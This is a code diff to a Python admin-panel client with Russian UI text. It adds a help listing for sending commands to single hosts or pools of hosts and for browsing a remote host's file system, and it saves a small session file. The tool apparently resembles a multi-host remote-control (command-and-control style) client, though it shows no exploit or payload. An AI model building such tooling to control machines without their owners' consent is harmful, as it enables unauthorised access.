@@ -60,8 +60,12 @@ class Session:
     @staticmethod
     def save_session(session_uid: str):
         """ Сохраняет файл сессии в директорию админской сессии """
+        session_file_struct = {
+            "hostname": None
+        }
+
         with open(Session.SESSION_DIR.joinpath(session_uid), "w") as fp:
-            pass
+            json.dump(session_file_struct, fp)
 
 
 class BasePacket(abc.ABC):
@@ -349,6 +353,24 @@ def main():
             session.remove()
             print(f"[{colored('?', 'yellow')}] Вы вышли из личного кабинета.\n")
             exit(0)
+
+        elif command == "help":
+            print(f"""[{colored('?', 'yellow')}] Список команд админской панели.
+Последнее обновление: 12.09.2022\n
+[[ РЕЖИМЫ ОТПРАВКИ ПАКЕТОВ ]] 
+* unicast (host_id) - Переключается на отправку команд хосту, указанному в поле host_id.
+* broadcast (pool_id) - Отправляет команды всем хостам в пуле, указанном в поле pool_id.
+
+[[ УПРАВЛЕНИЕ ПУЛОМ ]]
+* pool create - Создает новый пул. Чтобы узнать его номер, введите следующую команду.
+* pool members - Выводит список всех участников во всех админских пулах.
+* pool delete - Удаляет пул.
+
+[[ КОМАНДЫ УТИЛИТЫ "FS" ]]
+* fs pwd - Возвращает текущий путь хоста.
+* fs cd - Меняет текущий путь хоста.
+* fs ls - Возвращает список всех файлов в текущем каталоге. 
+""")
         # -------------------------------------------------------------------------------------------------------
 
         # -------------------------------------------------------------------------------------------------------
@@ -450,10 +472,6 @@ def main():
                 print(f"[{colored('+', 'green')}] Пул был успешно удален.")
             else:
                 print(f"[{colored('-', 'green')}] Ошибка сервера: {response.COMMENT}")
-
-        elif command.startswith("pool members "):
-            connection = ServerConnection()
-            response = connection.send_packet(ServerPacket(f"GET_POOL_MEMBERS:{command.split(' ')[2]}"))
         # -------------------------------------------------------------------------------------------------------
 
         # -------------------------------------------------------------------------------------------------------
